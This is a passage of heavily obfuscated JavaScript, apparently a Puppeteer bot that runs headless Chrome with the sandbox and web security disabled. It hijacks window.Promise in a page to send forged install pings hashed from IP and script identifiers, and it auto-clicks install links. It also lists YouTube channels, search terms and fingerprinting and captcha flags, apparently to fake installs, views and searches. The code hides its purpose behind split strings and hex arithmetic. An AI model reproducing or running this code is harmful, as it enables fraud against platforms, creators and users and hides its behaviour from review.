* -0x197 | L >> -0x13d * -0x1 + -0x1bc1 + 0x550 * 0x5 & 0x1 * -0x2306 + -0x1 * 0x175d + 0x3aa2) << y[0x2 * -0x84f + -0x2361 * -0x1 + 0x640 * -0x3 & N++], P[N >> -0x5 * 0x40 + -0x17 * 0xa7 + 0x1043] |= (-0x1 * -0x173b + -0x22 * -0xd1 + -0x327d | L >> 0x13c3 * -0x1 + 0x1 * 0x179f + -0x1 * 0x3d6 & 0x1277 + 0x134b * 0x1 + -0x2583) << y[-0x2083 + -0x2428 + 0x44ae & N++], P[N >> 0x4 * 0x1bf + -0x15a5 + 0x1 * 0xeab] |= (0x1e65 + -0x2 * 0xc2f + -0x587 | 0xd25 + 0x14fc + 0x10f1 * -0x2 & L) << y[0x21 * 0xb + 0x1b23 * -0x1 + 0x19bb & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1cf0 + -0x34 * -0xba + -0x4278 ? (this['block'] = P[-0x8 * -0x3b4 + 0x193c + -0x36cc], this['start'] = N - (-0xd13 + -0x1c32 + -0x3 * -0xdd7), this['hash'](), this['hashed'] = -0x135 * -0x10 + 0x19 * -0xc1 + -0x76) : this['start'] = N;
                }
                return this['bytes'] > -0x9682d94 + -0xc058cc * -0x3d + 0xdb9304f7 && (this['hBytes'] += this['bytes'] / (-0x4 * -0x1019771a + 0x29 * -0x2380b34 + 0x11a93eeec) << -0x1d * 0x12e + -0x214c + 0x4382, this['bytes'] = this['bytes'] % (-0x1782e8cd8 + -0x92bd60b8 + 0x88 * 0x5ba3492)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x2605 + 0x97c + 0x1c8a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xf02 + 0x29c * -0x5 + 0x1 * 0x1c1e] = this['block'], J[K >> 0x365 * -0xb + -0x5 * -0x337 + -0xe * -0x185] |= x[0xeab + -0xbba + -0x2ee & K], this['block'] = J[-0x21ba + -0xa52 + 0x2c1c], K >= 0x3f * 0x35 + -0xa * 0x8f + -0x73d * 0x1 && (this['hashed'] || this['hash'](), J[-0x660 + 0x111 * -0xe + -0x36 * -0x65] = this['block'], J[0x18 + -0x72e + 0x726] = J[-0x198 * -0x17 + -0x8e * -0x1a + -0x3313 * 0x1] = J[-0x17 * 0x158 + -0x1 * 0x41f + 0x2309] = J[-0x13 * 0x17e + 0x2 * -0x8db + 0x5 * 0x937] = J[0xb90 * -0x1 + -0x1deb + 0x3 * 0xdd5] = J[0x1 * 0x1ae9 + 0x8 * 0x397 + -0x379c] = J[-0x2e3 * -0x9 + -0x4fc + -0x14f9] = J[-0x2bf * -0x7 + 0x2cf + -0x1601] = J[0x16 * -0x41 + 0xbd6 + -0x638 * 0x1] = J[-0x1099 + -0x1aad * 0x1 + 0x2b4f] = J[-0x226c + -0x752 * 0x1 + 0x2 * 0x14e4] = J[-0xb * 0x1a5 + 0x20c4 + -0xea2] = J[0x1a8c + -0x1 * 0x22d1 + 0x1 * 0x851] = J[0x107b + 0x3cf * -0x3 + 0x3 * -0x1ab] = J[0x6ac + 0x1e48 + -0x24e6] = J[0x1 * 0x26c5 + 0x1 * -0x6bb + -0x1ffb] = -0x1528 + -0x3 * -0xbb9 + -0xe03), J[-0x226c + -0x2589 * -0x1 + -0x30f] = this['hBytes'] << -0x16f * -0x15 + 0x5 * 0x3a5 + -0x3051 | this['bytes'] >>> -0xaa0 + -0x8cb * -0x1 + 0x1f2, J[0xe9 + -0x205d + 0x1f83 * 0x1] = this['bytes'] << -0x1 * -0x211a + -0xc1 * -0x25 + -0x3cfc, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2d7 * -0x4 + -0x1 * -0x77b + -0x1 * -0x3f1; J < -0xaf0 + 0x205c + -0x1c * 0xc1; ++J)
                K = Q[J - (-0x7b9 * 0x5 + -0x25a * -0x4 + 0x1d38)] ^ Q[J - (-0xae * -0x34 + -0x296 * 0x4 + -0x18f8)] ^ Q[J - (-0x1 * -0x1d8a + -0x1a4d + -0x32f)] ^ Q[J - (0x4 * -0x151 + 0xb3 * 0x22 + -0x2 * 0x939)], Q[J] = K << -0x1c0c + 0x2 * -0x676 + 0x28f9 | K >>> -0xf18 + 0xa3 * -0x6 + 0x1309 * 0x1;
              for (J = 0xba8 + -0x1 * 0x1031 + 0x183 * 0x3; J < 0x19a5 + -0x216f + 0x7de; J += 0x1 * 0x2220 + 0x1d44 + 0x1 * -0x3f5f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4 * 0x308 + 0xbcb * 0x1 + -0x7 * 0x36a | L >>> 0x8a5 * 0x2 + -0x1 * -0x122 + -0x3 * 0x61b) + (M & N | ~M & O) + P + (0x16475499 * -0x2 + -0xd94f5b7 * -0x7 + 0x27fe6aca) + Q[J] << 0xef * 0x22 + -0x1179 + -0xe45) << 0xa5f + 0xc * -0xd3 + -0x76 | P >>> -0x1 * 0x1e9 + -0x171c + 0x86 * 0x30) + (L & (M = M << -0x1191 * 0x1 + 0xa * 0x1 + -0x1 * -0x11a5 | M >>> -0x7 * 0xed + 0x4 * 0x641 + -0x9 * 0x20f) | ~L & N) + O + (-0x5b92b2b6 + 0xbc8af7 + 0x862cdc * 0x15a) + Q[J + (-0x1f75 + 0x1b0e + 0x468)] << 0x2385 + -0x224f * -0x1 + -0x45d4) << -0x8 * 0x77 + 0x1f68 + -0x1bab | O >>> -0xad6 + 0x1c7 * 0x3 + 0x2 * 0x2ce) + (P & (L = L << 0x1979 + -0xbf * -0x3 + -0x1b98 | L >>> 0x2 * -0x1286 + -0x15dd + -0x3aeb * -0x1) | ~P & M) + N + (0x2ec7dd5 * -0x29 + -0xa30fe3cc + -0xbab94241 * -0x2) + Q[J + (-0x609 * -0x4 + 0x2d * 0x67 + -0x2a3d)] << 0x1 * 0x130f + -0x2b7 + 0x20b * -0x8) << 0x16c9 + 0x1e2b + -0x34ef * 0x1 | N >>> 0xa * -0x287 + -0x7c5 + 0x2126) + (O & (P = P << 0x1 * 0xac1 + 0x2292 + -0xa3 * 0x47 | P >>> -0x46c + 0x6ea + 0x13e * -0x2) | ~O & L) + M + (0x307 * -0x2332b1 + 0x5852d595 + -0x5b21 * -0x1317b) + Q[J + (0x2b * 0x7 + -0x16b + 0x41)] << 0x1d14 * 0x1 + -0x1 * 0x10d7 + -0xc3d) << -0x16aa + -0x28c * 0x4 + 0x20df | M >>> 0x241a + 0x263f * 0x1 + -0x1 * 0x4a3e) + (N & (O = O << 0x1ab * 0x11 + 0x1a17 * 0x1 + -0x4c * 0xb7 | O >>> -0x3 * -0xae3 + -0xa17 * 0x3 + -0x262) | ~N & P) + L + (0x33e * -0x2921ed + -0xa0454453 + 0x18023bc52) + Q[J + (-0x1e09 + -0x2303 + 0x411 * 0x10)] << -0x1642 + 0xd0d + 0x935, N = N << -0x167d + -0xf37 + 0x25d2 | N >>> -0x1 * 0xe7a + 0xe12 * -0x1 + 0xd7 * 0x22;
              for (; J < 0x2 * 0x1b7 + -0x1c71 + 0x192b; J += 0x1 * -0x2f8 + 0x261 + 0x9c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2088 + -0x2360 + 0x1 * 0x43ed | L >>> 0x7 * -0x106 + 0x26c5 + 0x30 * -0xa8) + (M ^ N ^ O) + P + (0x166d1842 * -0x6 + -0x2 * -0x5547b719 + 0x4ad90efb) + Q[J] << -0x14 * -0x1e5 + -0x139f + 0x617 * -0x3) << -0x1 * 0x244d + 0x1 * 0x19ae + -0x6 * -0x1c6 | P >>> -0x2474 + 0xac * 0x25 + 0x5 * 0x257) + (L ^ (M = M << -0x15 * 0x6a + 0x1c9 * -0x12 + 0x28f2 | M >>> -0x3a3 + -0x25f2 + -0xd * -0x333) ^ N) + O + (0x166f55c3 + 0x7a8c541 * 0x13 + -0x1 * 0x391c0df5) + Q[J + (0x20d1 + 0x6d * -0x1 + -0x2063)] << 0x538 + -0x1 * -0x2267 + -0x3 * 0xd35) << -0x1ac + 0xf2d + -0xd7c | O >>> 0x175f + 0x1e83 * -0x1 + 0x73f) + (P ^ (L = L << -0x649 + 0x2483 + -0x2 * 0xf0e | L >>> 0x18c2 + 0x1035 + -0x28f5) ^ M) + N + (0xe3f87f * 0x27 + -0x1 * -0x1e67bed7 + 0x2db75171) + Q[J + (0x13 * 0x1bb + -0x45e + -0x1c81)] << 0x178e + 0x1d0f + -0x349d) << 0x59 * 0x24 + 0x5 * 0x7cf + -0x338a | N >>> 0x689 + -0x20e4 + 0x1a76) + (O ^ (P = P << 0x269d * 0x1 + -0x1b17 + -0x5 * 0x248 | P >>> 0x1963 + -0x266b + 0xd0a) ^ L) + M + (-0x75f628b5 * 0x1 + -0x2b239e98 + 0x10ff3b2ee) + Q[J + (0x35 * 0x1 + -0x90e * 0x1 + 0x8dc)] << 0x6 * 0x481 + 0x1f08 + -0x3a0e) << -0x1343 * 0x1 + -0x4 * -0x389 + 0x524 | M >>> -0x4a5 * 0x2 + 0x11c + 0x2c3 * 0x3) + (N ^ (O = O << 0x1607 + -0x795 + -0xe * 0x106 | O >>> 0x2672 + -0x20 + -0x2650) ^ P) + L + (-0x2a1a7c31 + -0x45dc245a + 0x4 * 0x37b4230b) + Q[J + (-0x1 * 0xa84 + 0xc8d + -0x205)] << 0x1 * 0x1b91 + -0x9d6 * 0x2 + -0x7e5, N = N << 0x5 * -0x16d + 0x2 * 0x323 + 0xf9 | N >>> -0x1 * 0x7c9 + 0x2b9 * 0x2 + -0x259 * -0x1;
              for (; J < -0x2583 * 0x1 + 0xf * -0x12e + -0x53 * -0xab; J += 0xa9f + 0x2049 + -0x2ae3 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2198 + -0xc6b + -0x7ac * -0x6 | L >>> -0x2459 + 0xd33 + 0x1741) + (M & N | M & O | N & O) + P - (0x30817d5a + 0x2dda * -0x4c576 + 0x9dca * 0x1cb67) + Q[J] << -0x92 * 0x31 + -0x736 + -0x18 * -0x177) << -0x1 * -0xf47 + 0xd * 0x1aa + 0x626 * -0x6 | P >>> -0x22e1 + -0x1 * -0x38b + -0x1 * -0x1f71) + (L & (M = M << -0x1351 + -0x2d7 * 0x7 + 0x2750 | M >>> 0xec * 0x2 + 0x2087 + -0x1cf * 0x13) | L & N | M & N) + O - (0xb6402ece + 0x1b598d9d + -0x60b57947) + Q[J + (0x8 * -0xba + -0xe8 + 0x6b9)] << -0x32f * 0x8 + 0x2266 + -0x6 * 0x17d) << -0xfe * -0x8 + 0x1259 + -0x1a44 | O >>> 0x3f9 + -0x21cf + 0x1ff * 0xf) + (P & (L = L << -0x5 * 0x5db + 0x2513 + -0x7ae | L >>> -0x2f * 0x58 + 0x133f + -0x315) | P & M | L & M) + N - (0x9e385e09 + -0xc1a8fb90 + -0x3 * -0x3171a039) + Q[J + (-0x12ae + 0x167 * 0x2 + -0xfe2 * -0x1)] << -0x69 + -0x2136 + 0xb35 * 0x3) << -0x824 * -0x2 + -0x254 + -0x4a5 * 0x3 | N >>> -0x1218 + 0x111b + 0x118) + (O & (P = P << -0x46 * -0x4c + -0x1 * -0x26f1 + -0x3b9b | P >>> -0x86 * -0x5 + 0x9f7 + -0xc93) | O & L | P & L) + M - (-0x2317 * 0x46966 + -0xc318c2d9 + 0x1cecb7027) + Q[J + (-0xbbd + 0x1 * 0x603 + 0x5bd)] << -0x1eca + -0x20f0 + 0x6 * 0xa9f) << 0x22ca + 0x25fa + -0x48bf | M >>> 0x1346 * -0x1 + -0xb9e + 0x1eff) + (N & (O = O << 0x11f * -0x18 + 0xc5c * -0x1 + 0x2762 | O >>> -0x1482 + -0xe14 + 0x2298) | N & P | O & P) + L - (0x93f3f8ca + -0xddac6db4 + 0xba9cb80e) + Q[J + (0x1910 + 0x19b7 + 0x5 * -0xa27)] << -0x1436 + -0xf8 * -0x10 + 0x4b6, N = N << 0x4 * -0x760 + 0x1f1c + -0x17e | N >>> -0xa7b + -0x2357 + -0x4 * -0xb75;
              for (; J < -0x3fb * -0x5 + -0xa25 + -0x1f * 0x4e; J += 0x192c + 0x54 * -0x25 + 0xd03 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x16a9 + 0x1f51 + -0x8a3 | L >>> 0x1 * -0x69 + 0x1 * 0x3bb + -0x337) + (M ^ N ^ O) + P - (0x62b7e613 + -0x45e994c5 + 0x18ceecdc * 0x1) + Q[J] << 0xf22 * -0x1 + -0x1 * 0x1d5d + 0x2c7f) << 0x1886 + -0x1 * -0x1ec7 + -0x1d * 0x1e8 | P >>> -0xe29 + 0x265e + -0x181a) + (L ^ (M = M << 0x392 + 0x641 * 0x3 + -0x1637 | M >>> -0x44 + 0xb3c + -0xaf6) ^ N) + O - (-0x4f96b1 * 0x90 + 0x10f95dea + 0x5168a3d0) + Q[J + (-0xee1 + 0x1f7e + -0x109c * 0x1)] << -0x1006 + 0x3e5 * -0x5 + 0x3 * 0xbd5) << 0x2 * 0x445 + -0x1 * -0x141b + -0x1ca0 | O >>> 0xeb5 + -0x177 + -0xd23) + (P ^ (L = L << -0x35b * -0x6 + -0xb8a + 0x136 * -0x7 | L >>> -0x260d + -0xb * 0xf2 + 0x3075) ^ M) + N - (0xfef23b8 + 0x372fd5e6 + -0x1181bb74) + Q[J + (0x5 * -0xd1 + -0x2673 + 0x2a8a)] << -0x164a + -0x24 * -0xb + -0x127 * -0x12) << -0x9 * -0x251 + -0x5cd + 0x1 * -0xf07 | N >>> -0x1a0f + 0x1fd4 + 0x1d * -0x32) + (O ^ (P = P << 0x9 * 0x24e + -0xcdb * -0x1 + -0x217b | P >>> 0x1ab * -0x3 + -0x6e0 + 0xbe3) ^ L) + M - (0x2 * -0xa0d139f + 0x16909b19 * -0x1 + 0x60480081) + Q[J + (0x144d + -0x20a6 + -0x62e * -0x2)] << -0x4fe + 0x1 * -0x2345 + 0x2843) << 0x66d + -0x3 * 0x1a6 + -0xbb * 0x2 | M >>> 0x171 + 0xcbc + -0xe12) + (N ^ (O = O << -0x1b74 + -0x3d * -0x9d + -0x1 * 0x9d7 | O >>> 0xac9 + 0x1 * -0x18e3 + 0xe1c) ^ P) + L - (-0xae8845 + -0x37d2d017 + 0x6e1e9686) + Q[J + (-0x96c + 0x11db * 0x1 + -0x86b)] << 0x3 * -0x5e1 + -0x202e * 0x1 + -0x27 * -0x147, N = N << 0x4f * 0x1a + 0x47d + -0xc65 | N >>> 0x1 * 0xfe5 + 0x26 * 0x53 + -0x1c35;
              this['h0'] = this['h0'] + L << 0x1 * -0x7d9 + -0xc54 + 0x5 * 0x409, this['h1'] = this['h1'] + M << -0x1 * -0x17a5 + 0x543 + -0x1ce8, this['h2'] = this['h2'] + N << 0x13ed + -0x1387 + 0x2 * -0x33, this['h3'] = this['h3'] + O << 0x1 * 0x316 + -0x494 * -0x5 + -0x19fa, this['h4'] = this['h4'] + P << 0x5a9 * 0x3 + 0x2f7 * 0x9 + -0x2baa;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x113d + 0x84d * -0x1 + 0x19a6 & -0x8e6 + 0x4 * -0x229 + 0x1199] + w[J >> -0x15d * 0x5 + 0x215 + 0x135 * 0x4 & 0x1ac1 + 0x1bf9 + 0x137 * -0x2d] + w[J >> 0x4c1 * -0x3 + 0x2035 + 0x11de * -0x1 & 0x56 + 0x1 * -0x1d89 + 0x1d42] + w[J >> 0x12 * -0x19a + -0xea + 0x1dce & 0x529 * -0x5 + -0x1ca1 + -0x179 * -0x25] + w[J >> 0x8c0 + -0x26ea + 0x1e36 & 0xd * 0x89 + -0x7 * 0x287 + 0xacb] + w[J >> 0x1 * -0xc89 + 0x16f8 + -0x1 * 0xa67 & -0x1924 + -0x351 * -0x3 + 0x7a * 0x20] + w[J >> -0x5 * 0x687 + -0xaee * -0x3 + -0x23 & 0x1ebd + 0x895 + -0x211 * 0x13] + w[0xbf5 * 0x1 + 0x1e84 + -0x2a6a & J] + w[K >> 0x1c * -0x106 + 0xa1f + 0x12a5 & 0x21d2 + -0x22ad + 0xea] + w[K >> 0x1529 * -0x1 + 0x2fc + 0x1245 & -0x61b + -0x57c * -0x4 + -0x6 * 0x2a1] + w[K >> 0x10d6 + 0x1 * -0x15e3 + 0x521 & -0xa * -0x3cb + -0x1a62 + 0xad * -0x11] + w[K >> 0xe91 + -0x257d + 0x16fc & -0xd91 + -0x32d + 0x10cd] + w[K >> -0x652 * 0x6 + 0xc50 + 0x19a8 & -0x6e1 + -0x137d + -0x267 * -0xb] + w[K >> 0xd3 * -0x23 + -0x1 * 0x1144 + 0x2e25 & 0xc33 + -0x1 * 0x2122 + 0x14fe] + w[K >> -0x1 * 0xac7 + 0x238f + 0x14 * -0x13d & 0x52f * 0x1 + 0x2287 * 0x1 + -0x27a7] + w[-0x189 * -0x3 + -0x3 * 0xc31 + 0x2007 & K] + w[L >> 0x11 * -0x1dd + -0x1df * -0xf + -0x1dc * -0x2 & 0x986 + -0x25fd + -0x1 * -0x1c86] + w[L >> -0x1f40 + -0x2547 + 0x449f & -0xd54 + 0x1910 + 0x7 * -0x1ab] + w[L >> -0x1 * -0x59f + 0xc69 * 0x1 + 0x2 * -0x8fa & -0x6 * -0x29c + -0xa3 * -0x1 + -0x40f * 0x4] + w[L >> 0x1420 + -0x1 * 0x176c + 0x35c & 0x272 + -0x194d + 0x16ea] + w[L >> 0x196c * 0x1 + 0x186f + -0x31cf & -0x2141 + 0x182a + -0x926 * -0x1] + w[L >> 0xae3 * 0x1 + -0xd * -0x175 + 0x4 * -0x773 & 0x1 * -0x10d2 + 0x1cb + 0xf16] + w[L >> -0x181e * 0x1 + 0x2292 + -0x29c * 0x4 & -0x226b + 0xf06 + 0xa * 0x1f2] + w[-0x1ac9 + 0xbb5 + 0xf23 & L] + w[M >> 0x1 * -0x215b + -0x1125 + -0x29 * -0x13c & 0x25a4 + 0x1b2d + -0x40c2] + w[M >> 0x27c + -0x971 + 0x169 * 0x5 & 0x6 * -0x31 + 0x23dd + 0x1154 * -0x2] + w[M >> 0x17cc + 0xc72 * -0x1 + -0x5a3 * 0x2 & 0x9e + -0x1 * -0x1f47 + 0x1fd6 * -0x1] + w[M >> 0x2356 * 0x1 + 0x1ed4 + -0x421a & -0x1 * 0x597 + -0x9e + 0x644] + w[M >> 0x25d * -0xd + -0xc3e * -0x2 + 0x649 & 0x14bc + -0x5 * -0x15d + -0x1b7e] + w[M >> -0x1dd5 + -0x106a + -0xb * -0x435 & 0xca1 + -0x2025 + 0x1393] + w[M >> 0x1de3 * -0x1 + -0x4d * -0x4b + 0x758 & -0x5 * 0x4f4 + -0x3 * 0x2ed + -0x16 * -0x187] + w[0x1 * 0x257f + -0x7e9 + 0x1d87 * -0x1 & M] + w[N >> 0x16a2 + 0x1 * -0x1dcc + 0x746 & -0x193c + -0x2351 + 0x3c9c] + w[N >> 0x1 * 0x824 + 0xe87 + -0x1693 & -0x85 * -0x2f + -0xe * 0x3e + -0x14f8] + w[N >> 0x507 + 0x4e1 * 0x7 + 0x1a * -0x181 & -0x6b7 + 0x498 + 0x22e] + w[N >> 0xb * 0x82 + 0x107 + -0x68d * 0x1 & -0x5 * 0x321 + 0x234 * 0x4 + 0x6e4] + w[N >> 0x1453 + -0x1085 * 0x1 + 0x1 * -0x3c2 & 0x109f + -0x5 * 0x5b5 + -0xbf9 * -0x1] + w[N >> 0x11b1 + -0x13 * -0x1d1 + -0x342c & 0x923 * -0x3 + 0x1c6 + -0x19b2 * -0x1] + w[N >> -0x244 + 0x22e + 0x1a & -0x4 * 0x852 + 0x1f53 + 0x6 * 0x56] + w[-0x1 * -0x232c + 0x96a + -0x2c87 * 0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xa79 * -0x2 + -0x1270 + -0x26a & -0x26f0 + -0x135c + 0x3b4b,
                J >> -0x20a8 + -0x13fd + 0x34b5 & -0x5 * -0x29b + 0x17f0 + -0x2 * 0x11fc,
                J >> 0x1b52 + -0x2 * 0x6c9 + -0xdb8 & 0xc1 * 0x22 + -0x66 * 0x1d + 0x1 * -0xd15,
                0x36 * 0x40 + 0x3 * 0xcb3 + -0x329a & J,
                K >> -0xd28 * 0x1 + 0x2 * -0x1297 + 0xa16 * 0x5 & -0xc99 + 0x20e3 + -0x134b,
                K >> 0x1bfd + 0x2 * -0xaad + -0x693 & -0x1 * 0x24f3 + 0x1 * 0x20b0 + 0x542,
                K >> -0x1 * -0x1f1 + 0x22d * 0x1 + -0x416 & 0xdfa * -0x2 + 0xaa9 * -0x3 + 0x3cee,
                -0x1bd1 + -0x93 + 0x1d63 & K,
                L >> -0x695 + -0x1 * 0x90f + 0xfbc & 0x1d9f * -0x1 + 0x1 * -0x120b + 0x30a9 * 0x1,
                L >> -0x18ef * 0x1 + 0x3d + -0x18c2 * -0x1 & 0xcc8 + -0x147f + 0x8b6,
                L >> -0x51 * 0x6b + -0x44 * 0x43 + -0x33af * -0x1 & -0x4a + 0x2 * -0x9d6 + 0x14f5,
                0x14ec + 0x14d3 + -0x28c0 & L,
                M >> 0x10e7 + 0x4d * 0x4c + -0xf * 0x2a5 & -0xc31 + 0x7f3 + 0x53d,
                M >> 0x1731 + -0x1c69 + -0xa9 * -0x8 & 0x1981 + 0x5 * -0x5bf + 0x439 * 0x1,
                M >> 0x8b * 0x3d + -0xf * -0xe7 + 0x20 * -0x175 & -0x293 * 0xb + 0x96c * 0x3 + -0x43 * -0x4,
                0x207f + -0x2d * 0x78 + -0xa68 & M,
                N >> -0x1 * 0xeca + 0x1 * 0x1d7b + -0xe99 * 0x1 & 0x12e * -0x20 + 0x9a1 + -0x1 * -0x1d1e,
                N >> 0x1699 + -0x2a1 + -0x13e8 & -0x1 * -0x1f57 + -0x905 + -0x67 * 0x35,
                N >> 0xee0 + -0x97f * 0x3 + -0x7 * -0x1f3 & 0xf49 + -0x1 * -0x41a + 0x2 * -0x932,
                -0x1eb4 + -0xc7 * -0x9 + 0x18b4 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x23a7 * 0x1 + 0x23e + -0x25d1), (K = new DataView(J))['setUint32'](0x19 * -0xb3 + -0x1 * -0xd88 + 0x1 * 0x3f3, this['h0']), K['setUint32'](0x2695 + 0x3 * -0x46c + 0x1 * -0x194d, this['h1']), K['setUint32'](-0x7 * 0x170 + 0x111b + -0x167 * 0x5, this['h2']), K['setUint32'](-0x342 + 0x72d * -0x5 + 0x272f, this['h3']), K['setUint32'](-0xf * -0x1df + 0xb98 + -0x2799 * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x29b * 0x6 + -0xdb5 + -0x1ed];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xa79 + 0x2526 + -0x2f9f;
            J[0x561 + -0x1404 + 0x1 * 0xea3]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x6ce + 0x149 * 0x11 + -0x1ca7] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x3af + 0x7f5 + -0xba3), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1d07 + 0x35 * 0x40 + 0x2a46 * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x146 * -0x1e + -0xe5e + 0x3a6e), Promise['resolve'](0x2 * -0x7a4 + -0x1 * -0x1aff + -0x2 * 0x5db);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0xc3 * 0x2 + -0x5f3 * -0x6 + -0x2d9 * 0xc; j < -0x10ae + 0xf * -0x6 + 0x1109; j++)
    i();
}
const NETWORK_PATIENCE = -0x3b * 0x89 + 0x240b + -0x4 * -0x6b2 + (-0x660 + 0x17ff + -0x5e7) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x21fe * 0x1 + -0x9 * 0x1d6 + 0x3287) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      S(0x17) + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x267 * -0xf + -0x253a + 0x4943; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const T = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f[T(0xb)](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms[S(0x9)](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 